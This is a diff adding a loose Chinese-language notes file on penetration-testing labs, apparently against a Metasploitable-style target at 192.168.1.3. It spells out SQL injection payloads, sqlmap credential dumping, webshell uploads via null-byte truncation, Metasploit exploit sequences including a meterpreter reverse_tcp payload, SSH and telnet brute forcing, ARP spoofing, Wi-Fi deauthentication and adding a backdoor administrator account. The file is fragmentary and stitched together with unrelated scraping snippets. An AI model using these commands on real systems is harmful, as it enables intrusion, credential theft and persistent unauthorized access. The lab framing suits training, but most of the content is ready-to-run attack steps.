@@ -1,0 +1,474 @@
+arp：https://xianzhi.aliyun.com/forum/read/257.html
+
+py -2 pip install dnspython
+py -3 -m pip  install requests
+/usr/games/fortune
+py -2
+inurl:.php? intext:CHARACTER_SETS,COLLATIONS, ?intitle:phpmyadmin
+
+
+git push origin
+git push origin  master
+
+
+Ideapad 110-15ISK-IFI
+
+
+1524 6667 8180 445,139  80 1099 3306 22 8081 514
+sqlmap，
+在终端中输入命令“`sqlmap –u http://192.168.1.3:8008/onews.asp?id=45 --users`”获取到用户名
+在终端中输入命令“`sqlmap –u http://192.168.1.3:8008/onews.asp?id=45 -–dump –tables `”探测数据库和表信息
+在终端中输入命令” `sqlmap -u http://192.168.1.3:8008/onews.asp?id=45 --dump -T admin -C admin,password`”,进行暴库,获得用户名和密码
+
+
+python -m SimpleHTTPServer 8000
+
+
+所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。
+
+首先，在以【.asp?id=32（数字任意）】结尾的链接依次添加语句【'】、【and 1=1】和【and1=2】，来判断网站是否存在注入点。
+然后，添加语句【and exists(select * from admin)】，根据页面返回结果来猜解表名。
+
+再次，添加语句【and exists(select admin from admin)】，来猜解admin表中的列名admin。
+
+最后，添加语句【and (select top 1 len (admin) from admin)>1】，来猜解字段长度；添加【and (select top 1 asc(mid(admin,1,1)) from admin)>97】，来猜解字段中字符的ASCII码。
+通过以上四个步骤，反复猜解，即可得到数据库存储的用户名和密码。
+
+1）理解联合查询的原理
+2）学习联合查询的过程
+## 【实验原理】
+首先，在链接后面添加语句【order by 11（数字任意）】，根据页面返回结果，来判断站点中的字段数目。
+然后，在链接后面添加语句【union select 1,2,3,4,5,6,7,8,9,10,11 from admin（表名）】，进行联合查询，来暴露可查询的字段编号。
+最后，根据上一步得到的字段编号，添加语句【union select 1,admin,password,4,5,6,7,8,9,10,11 from admin】，直接暴露管理员用户名和密码。
+
+
+WEB攻防与渗透技术：http://www.shiyanbar.com/experiment-course/detail/424
+未做出：http://www.shiyanbar.com/experiment-course/experiment-course/vid/2183
+1)数据库备份拿webshell
+1.1 在火狐浏览器中输入路径【`http://192.168.1.3:8002/admin/Login.asp】，进入到后台登录界面。如图1所示
+
+1.2 输入用户名【admin1】和密码【123456】，进入到后台管理界面。如图2所示
+
+二、上传文件
+2.1 在【荣誉管理】选项卡下，选择【添加企业荣誉】，即可弹出可上传文件页面。如图3所示
+
+2.2 点击【浏览】上传木马文件，将【C:\实验工具集\01_WEB安全\04_webshell上传技术\第16节 南方企业内容管理系统漏洞】目录下的木马文件【1.asp】改成【1.jpg】，点击上传。如图4所示
+
+2.3 点击【上传】，即可得到上传文件的地址【UploadFiles/20151215134642128.jpg】。如图5所示
+
+三、进行数据库备份
+3.1打开【系统管理】下的数【据库备份】，即可进入数据库备份页面，并将刚刚得到的木马文件的路径复制到当前数据库路径中，填写数据库备份名称【ok.asp】。如图6所示
+
+3.2 点击【确定】，即可得到数据库备份的路径【admin\Databackup\ok.asp】
+
+ 四、木马访问
+4.1 在火狐浏览器的地址栏中输入完整路径【`http://192.168.1.3:8002/admin/Databackup/ok.asp`】，即可访问木马，已经成功拿到webshell（密码：123456）
+
+
+
+
+Apache识别文件类型是从右向左识别的，如果如遇不认识的扩展名会向前一次识别，until遇到能识别的扩展名
+在BurpSuite中会抓到截取的数据包，在数据包中将所上传的文件的Content-Type由【application/octet-stream】改为【image/gif】
+
+
+select * from user where username='用户名' and password='密码'
+当提交username=pcat'='&password=pcat'='
+语句会变成如下：
+select * from user where username='pcat'='' and password='pcat'=''
+这时候还不够清晰，我提取前一段判断出来（后面的同样道理）
+username='pcat'=''
+这是有2个等号，然后计算顺序从左到右，
+先计算username='pcat' 一般数据库里不可能有我这个小名（若有，你就换一个字符串），所以这里返回值为0（相当于false）
+然后0='' 这个结果呢？看到这里估计你也懂了，就是返回1（相当于true）
+
+所以这样的注入相当于
+select * from user where 1 and 1
+也等于 select * from user
+
+
+
+
+打开网站(`http://192.168.1.3:8001/fckeditor`)判断是否有fckeditor编辑器，出现403禁止访问，说明此目录存在
+判断fckeditor编辑器版本号，输入http://192.168.1.3:8001/FCKeditor/_whatsnew.html`，由返回页面可知此fckeditor编辑器版本为2.0
+此版本fckeditor存在两个上传漏洞页面：
+FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp
+FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=zhang&CurrentFolder=/
+第一个页面是在网站根目录下的userfiles目录下的Image目录下打开一个上传页面，上传的文件都保存在这个目录下；第二是在网站根目录下的userfiles目录下创建一个zhang目录。
+1.4打开`http://192.168.1.3:8001/FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&connector=connectors/asp/connector.asp`
+
+
+
+
+
+、00截断
+2.12.1	我们上传一个正常图片，打开一个后台可以看到，我们上传一个图片1.jpg。
+
+2.2我们直接上传一个asp一句话文件，发现不允许上传。
+
+2.3那我们使用00截断试试。打开工具burpsuit【C:\实验工具集\01_WEB安全\04_webshell上传技术\第1节 Fckeditor漏洞上传webshell】。
+
+2.4在浏览器的“internet选项”中，设置代理为：127.0.0.1:8080 ，如图7所示
+
+2.5回到浏览器中，刷新刚才的页面，发现burpsuit抓取到刷新的数据包，点击forward。
+
+2.6切换到浏览器中，将位于【C:\实验工具集\01_WEB安全\04_webshell上传技术\第1节 Fckeditor漏洞上传webshell】中的2.asp改为2.asp.jpg。并将该文件上传。
+
+2.7此时burpsuite会拦截下上传的数据包。
+
+2.8点“HEX”，切换为hex模式。修改此处内容。
+
+2.9修改空格的十六进制2e为00。如图13所示
+
+2.10切换为raw模式，空格变为如图样子，点“forward”，发送请求。如图13所示
+
+2.11此时再次刷新上传页面，可以看到asp文件已经上传成功，至此，我们可以使用菜刀去连接这个一句话木马
+
+
+
+http://www.shiyanbar.com/course-video/watchVideo/cid/454/vid/2165
+kali劫持内网：目标机：
+ IPv4 地址 . . . . . . . . . . . . : 192.168.184.129
+ 子网掩码  . . . . . . . . . . . . : 255.255.255.0
+ 默认网关. . . . . . . . . . . . . : 192.168.184.2
+（win7）
+软件：ettercap 
+ettercap -G
+driftnet 保存是 driftnet -d /root/image -a
+
+
+nmap -sV 192.168.86.128(扫描端口）
+发现开放1524端口，telnet 192.168.1.3 1524”，连接目标主机1524端口
+在终端中输入命令“whoami”，查找获取的权限
+在终端中输入命令“ifconfig eth0”，查看网卡信息，在终端下输入“
+cat /etc/passwd”(注意空格）,查看远程主机的密码文件
+
+
+利用UnrealIRCd后门漏洞，获取目标主机的root权限
+在终端中输入命令“nmap –sV  192.168.1.3”，对目标主机进行端口扫描，发现开放6667端口,对应的服务为unreal ircd
+输入命令“msfconsole”，启动MSF终端
+在终端中输入命令“search unreal ircd”，搜索ircd的相关工具和攻击载荷
+终端中输入命令“use exploit/unix/irc/unreal_ircd_3281_backdoor”，启用漏洞利用模块
+show options”，查看需要设置的相关项，“yes”表示必须填写的参数
+输入命令“set RHOST 192.168.1.3”，设置目标主机的IP地址
+输入“exploit”, 开始向目标主机攻击，攻击成功后，建立shell会话
+终端中输入“whoami”,查看获得的权限为root，输入命令
+“cat /etc/passwd”,查看系统的帐号和密码
+
+
+利用Tomcat管理台默认口令漏洞,上传木马文件，获得目标主机webshell
+nmap –sV  192.168.1.3”，对目标主机进行端口扫描，发现开放8180端口并且运行着ApacheTomcat/CoyoteJSP engine1.1
+http://192.168.1.3:8180,打开tomcat页面，单击“Tomcat Manager”，`打开后台管理页面
+Browse”按钮，在目录“/home/” 下选择木马文件
+输入默认的账户tomcat，密码tomcat,单击”ok”
+http://192.168.1.3:8180/hacker/index.jsp,`webshell密码“87966550”，登陆webshell
+
+
+利用sysmlink漏洞读取目标主机的passwd文件内容
+Samba是一套实现SMB（server messages block）协议，跨平台进行文件共享和打印共享服务的程序，samba的sambd默认配置在可写文件共享时，存在目录遍历漏洞，远程用户可以通过smbclient端使用一个对称命，创建一个包含..的目录遍历符的软连接 ，可以进行目录遍历以及访问任意文件。
+“nmap –sV  192.168.1.3”，对目标主机进行端口扫描，发现开放445端口、139端口并且安装samba软件
+msfconsole”，启动MSF终端
+“search samba”，搜索samba的相关工具和攻击载荷
+“use auxiliary/admin/smb/samba_symlink_traversal”，启用漏洞利用模块, 
+info”，查看需要设置的相关项，“yes”表示必须填写的参数
+set RHOST 192.168.1.3”，设置目标主机的IP地址
+set SMBSHARE tmp”, 设置SAM可写文件。
+exploit”, 开始攻击
+新打开一个终端，输入“smbclient //192.168.1.3/tmp”,直接回车，不用输入密码。
+cd rootfs”, 进入rootfs目录,在终端下输入命令“ls”,列出目录
+“more /etc/passwd”, 查看目标主机系统中的密码
+sysmlink溢出的端口号：445
+
+
+
+利用samba漏洞，获得目标主机root权限
+Samba中负责在SAM数据库更新用户口令的代码未经过滤便将用户输入传输给了/bin/sh。如果在调用smb.conf中定义的外部脚本时，通过对/bin/sh的MS-RPC调用提交了恶意输入的话，就可能允许攻击者以nobody用户的权限执行任意命令。
+nmap –sV  192.168.1.3”，对目标主机进行端口扫描，发现开放445端口、139端口并且安装samba软件
+msfconsole”，启动MSF终端
+“search samba”，搜索samba的相关工具和攻击载荷
+use exploit/multi/samba/usermap_script”，启用漏洞利用模块
+info”，查看需要设置的相关项，“yes”表示必须填写的参数
+“set RHOST 192.168.1.3”，设置目标主机的IP地址。
+exploit”, 开始向目标主机攻击，攻击成功后，
+samba服务的端口号：139，445
+
+
+
+利用phpMyAdmin漏洞上传木马程序，获得webshell。
+CGI脚本没有正确处理请求参数，导致源代码泄露，允许远程攻击者在请求参数中插入执行命令。
+nmap –sV  192.168.1.3”，对目标主机进行端口扫描，发现开放80端口
+http:\\192.168.1.3”，访问目标网站
+“dirbuster”，启动软件对目标网站进行扫描
+192.168.1.3”，在File with list of dirs./file处选择字典文件（/usr/share/dirbuster/wordlists/目录下），单击“Start”按钮，开始扫描
+扫描结果显示包含cgi-bin目录、phpmyadmin目录等
+终端中输入命令“msfconsole”，启动MSF终端。
+输入命令“search php_cgi”，搜索php_cgi的相关工具和攻击载荷。
+“use exploit/multi/http/php_cgi_arg_injection”，启用漏洞利用模块
+show payloads”，显示Metasploit中可以在远程主机执行的代码，即shellcode。
+“set PAYLOAD php/meterpreter/reverse_tcp”，设置使用的shellcode代码
+show options”，显示攻击模块需要设置的参数
+set LHOST 192.168.1.2”,设置源主机的IP地址，用于会话的反向链接
+set RHOST 192.168.1.3”,设置目标主机的IP
+exploit”,开始对目标主机进行攻击
+sysinfo”,查看系统环境信息
+ls”,显示当前目录下的文件内容
+cat phpinfo.php”,查看文件内容
+
+
+利用java RMI SERVER命令执行漏洞，获得目标主机root权限
+Java RMI Server的RMI注册表和RMI激活服务的默认配置存在安全漏洞，可被利用导致代码执行
+nmap –sV  192.168.1.3”，对目标主机进行端口扫描，发现开放1099端口
+msfconsole”，启动MSF终端
+search java_rmi_server”，搜索RMI的相关工具和攻击载荷。
+use exploit/multi/misc/java_rmi_server”，启用漏洞利用模块
+show options”，查看需要设置的相关项
+set RHOST 192.168.1.3”
+exploit”, 实施攻击，攻击成功后，建立连接会话
+sysinfo”,查看系统信息，输入命令“Id”,查看用户权限
+
+
+利用Distcc后门漏洞获取目标主机的root权限
+Distcc用于大量代码在网络服务器上的分布式编译，但是如果配置不严格，容易被滥用执行命令，该漏洞是XCode 1.5版本及其他版本的distcc 2.x版本配置对于服务器端口的访问不限制。
+nmap –sV  192.168.1.3”，对目标主机进行端口扫描，发现开放1099端口
+msfconsole”，启动MSF终端
+search distcc_exec”，搜索distcc的相关工具和攻击载荷
+use exploit/unix/misc/distcc_exec”，启用漏洞利用模块
+show options”，查看需要设置的相关项，“
+set RHOST 192.168.1.3”，设置目标主机的IP地址
+exploit”, 开始向目标主机攻击，攻击成功后，建立会话
+id”,查看获得的权限t，输入命令“ifconfig”,查看目标主机IP。
+Distcc溢出的端口号：3632
+
+
+telnet端口23 mysql:3306
+使用枚举的方法破解telnet登陆密码
+nmap –sV 192.168.1.3”，扫描目标主机，发现目标主机开启telnet服务
+msfconsole”，启动MSF终端
+search telnet”，搜索telnet的相关工具和攻击载荷
+use auxiliary/scanner/telnet/telnet_login”，启用漏洞利用
+set RHOSTS 192.168.1.3”，设置目标主机的IP地址
+set PASS_FILE /home/passwd.txt”，爆破时使用的密码文件为passwd.txt
+set USER_FILE /home/user.txt”，爆破时使用的用户名文件为user.txt
+exploit 192.168.1.3”, 对目标主机进行暴力破解
+telnet 192.168.1.3 ”,输入获取的账号root和密码Simplexue123,连接成功
+
+
+利用SSH弱口令漏洞，获取目标主机权限
+靶机root用户存在弱口令漏洞，利用枚举的方法破解目标主机ssh服务
+nmap –sV  -O 192.168.1.3”，对目标主机进行端口扫描，发现开放22端口
+msfconsole”，启动MSF终端
+search ssh_login”，搜索ssh_login的相关工具和攻击载荷
+use auxiliary/scanner/ssh/ssh_login”，启用漏洞利用模块
+show options”，查看需要设置的相关项
+set RHOSTS 192.168.1.3”，设置目标主机的IP地址
+set USERNAME root”，指定登陆用户名root
+set PASS_FILE /home/passwd.txt”,设置暴利破解的密码文件路径
+set THREADS 50”,设置暴利破解的线程数为50
+run”, 开始向目标主机爆破ssh的登陆帐号和密码，登陆帐号为root,密码为Simplexue123
+ssh root@192.168.1.3”,连接目标主机
+
+
+
+利用Tomcat弱口令漏洞，破解出登陆密码，获得目标主机会话
+利用枚举的方法破解Tomcat的弱口令
+nmap –sV  192.168.1.3”，对目标主机进行端口扫描，发现开放8081端口并且运行着ApacheTomcat/CoyoteJSP engine1.1
+msfconsole”，启动MSF终端。
+search tomcat”, 搜索tomcat的相关工具和攻击载荷
+use auxiliary/scanner/http/tomcat_mgr_login”， 启用漏洞利用模块,
+set RHOSTS 192.168.1.3”,设置攻击目标主机IP。
+set RPORT 8180”,设置攻击目标主机端口号
+exploit”, 实施攻击。获得用户名tomcat,密码tomcat。
+use exploit/multi/http/tomcat_mgr_deploy”, 启用漏洞利用模块
+set RHOST 192.168.1.3”,设置攻击的目标主机IP
+set RPORT 8180”,设置攻击的目标主机端口
+“set username tomcat”,设置攻击时使用的登录账号tomcat
+set username tomcat”,设置攻击时使用的密码tomcat。
+exploit”,开始攻击，建立会话
+getuid”,查看获取的用户权限
+“help”,查看可以使用的命令。
+
+
+
+
+利用tcpwrapped服务的漏洞，获取目标主机权限
+nmap –sV  192.168.1.3”，对目标主机进行端口扫描，发现开放514端口，开放tcpwrapped服务
+msfconsole”，启动MSF终端
+search rsh_login”，搜索rsh_login的相关工具和攻击载荷
+use auxiliary/scanner/rservices/rsh_login”，启用漏洞利用模块
+set RHOST 192.168.1.3”，设置目标主机的IP地址
+set RPORT 514”，设置目标主机的端口号
+set PASS_FILE /home/passwd.txt”,设置破解使用的密码文件。
+set USER_FILE /home/user.txt”, 设置破解使用的登录用户名文件
+“exploit”, 开始向目标主机攻击，会话建立，表示溢出成功
+sessions”,查看会话数
+
+
+FTPscan远程破解ftp用户名与密码
+打开cmd命令行，进入到FTPScan目录
+【dir】命令，即可查看该目录下的文件
+输入【ftpscan】，即可进入到ftpscan的命令行界面，页面会显示语法信息
+ftpscan 192.168.1.3】，即可进行扫描
+绿色的代码即为目标主机FTP服务器的用户名和密码
+如何用FTPScan扫描多台主机
+
+
+
+http://open.freebuf.com/inland/461.html 后门生成
+
+
+OLLdbg：  F2：可以在光标停止处，断点，再按取消。
+          F8：单步步过。每按一次这个键执行一条反汇编窗口中的一条指令，遇到 CALL 等子程序不进入其代码
+          F7：单步步入。功能同单步步过(F8)类似，区别是遇到 CALL 等子程序时会进入其中，进入后首先会停留在子程序的第一条指令上
+          F4：运行到选定位置。作用就是直接运行到光标所在位置处暂停
+          F9：运行。按下这个键如果没有设置相应断点的话，被调试的程序将直接开始运行
+
+
+fping -asp 192.168.（254）.0/24 扫描网段存活主机 
+arp攻击：arpspoof -i eth0 (mubiaoip) (wangkaip) crtl+z停止
+
+拿到shell后：
+net user vip vip /add
+net localgroup administrators vip /add(加入管理员）
+远控：  sc config tlntsvr start=auto
+	net start telnet
+	telnet ip	
+
+攻击路由器：airmon -ng check kill
+	airodump -ng wlan0
+	aireplay -ng -0 -0 -a <BSSID> wlan0
+	(iwconfig wlan0 channel (攻击具体值))
+
+
+	
+>>> a=['hiu{}ijk'.format(str(i)) for i in range(30,930,30)]
+>>> print(a)
+py爬虫：分析目标：1，url格式 2，数据格式 3，网页编码
+beautifulsoup解析：
+	with open('url','r') as wb_data:
+		Soup = BeautifulSoup(wb_data,'lxml')
+copy selector选择地点
+		images = Soup.select('copy selector')
+		for ... in  zip(...):
+			data={
+				'title':title.get_text(),
+				...
+				'cata':list(cate.stripped_strings),#父级标签下所有的子标签
+				'images':image.get('scr')
+			}
+
+			
+写：
+from bs4 import BeautifulSoup
+import requests
+import time  #延迟
+headers={
+	'User-Agent':'...',
+	'Cookie':'...'
+}
+
+
+url='...'
+wb_data=requests.get(url,headers=headers)
+time.sleep(2）
+soup = BeautifulSoup(wb_data.text,'lxml')
+titles = soup.select('...')
+imgs = soup.select('...')
+meta = soup.select('...')
+for title,imgs,meta in zip(titles,imgs,meta)
+	data ={
+	'title':title.get.text(),
+	'img':img.get('...')
+	'meta':list(meta,stripped_strings)
+	}
+
+
+
+http://mp.weixin.qq.com/s/alj1y-MTB9xAN247NSUilA
+http://mp.weixin.qq.com/s/t1FpdSiZryobrC7kbX4Glg
+http://mp.weixin.qq.com/s/5D2TT0Sc5baXeR5BTQQL7g
+超棒黑客必备清单（分享自知乎网）https://zhuanlan.zhihu.com/p/26227423?utm_source=qq&utm_medium=social
+一叶知安 - 【新手必看】CTF学习站点总结（分享自知乎网）https://zhuanlan.zhihu.com/p/26876253?utm_source=qq&utm_medium=social
+
+
+Google语法
+intext:(正文)
+inurl:(含某个关键字的url)
+intitle:
+cache:(缓存的,以前的+网站)
+define:(解释)
+filetype:
+info:(网站,基本信息)
+link:(关键字为url的)
+site:(拓扑结构 eg:学院 site:pku.edu.cn)
+related:(与指定url相关的)
+phonebook:(商业或住宅phonenum)
+"":"表示精确搜索"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
